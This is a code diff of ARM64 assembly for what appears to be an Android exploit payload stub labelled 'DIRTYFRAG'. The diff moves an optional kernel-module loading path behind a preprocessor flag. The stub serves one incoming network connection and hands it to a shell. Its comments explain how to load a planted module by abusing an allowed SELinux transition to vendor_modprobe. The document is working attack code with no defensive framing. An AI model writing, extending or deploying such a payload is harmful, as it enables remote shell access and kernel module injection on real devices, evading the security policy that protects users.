@@ -35,7 +35,9 @@
     .global stub_end
     .global stub_sockaddr
     .global stub_name
+#ifdef DIRTYFRAG_MODULE
     .global stub_ko_target
+#endif
 
 stub_data:
 stub_sockaddr:
@@ -49,10 +51,11 @@ sh_path:
 env_path:
     .asciz "PATH=/sbin:/system/sbin:/system/bin:/system/xbin"
     .balign 8
-/* Module pipeline: the app patches a vendor_file target here; an empty first
- * byte keeps the W1 pipelines on the plain shell path. The worker child insmods
- * it as vendor_modprobe (init -> vendor_modprobe is an allowed transition and
- * vendor_modprobe holds module_load on vendor_file). */
+#ifdef DIRTYFRAG_MODULE
+/* Module pipeline (module-chain profiles only): the app patches a vendor_file
+ * target here. The worker child insmods it as vendor_modprobe (init ->
+ * vendor_modprobe is an allowed transition and vendor_modprobe holds
+ * module_load on vendor_file). */
 stub_ko_target:
     .space 64
 attr_exec:
@@ -64,6 +67,7 @@ selinux_ctx_end:
 exe_insmod:
     .asciz "/vendor/bin/insmod"
     .balign 4
+#endif
 
 stub_code:
     stp x0, x1, [sp, #-16]!
@@ -111,6 +115,7 @@ stub_code:
     svc #0
     cbnz x0, parent_close
 
+#ifdef DIRTYFRAG_MODULE
     // worker child: module prologue, then serve one connection.
     adr x1, stub_ko_target
     ldrb w2, [x1]
@@ -165,6 +170,7 @@ insmod_fail:
     mov x8, #SYS_exit
     svc #0
 
+#endif
     // child: serve exactly one connection, then hand it to a shell
 accept_loop:
     mov x0, x9
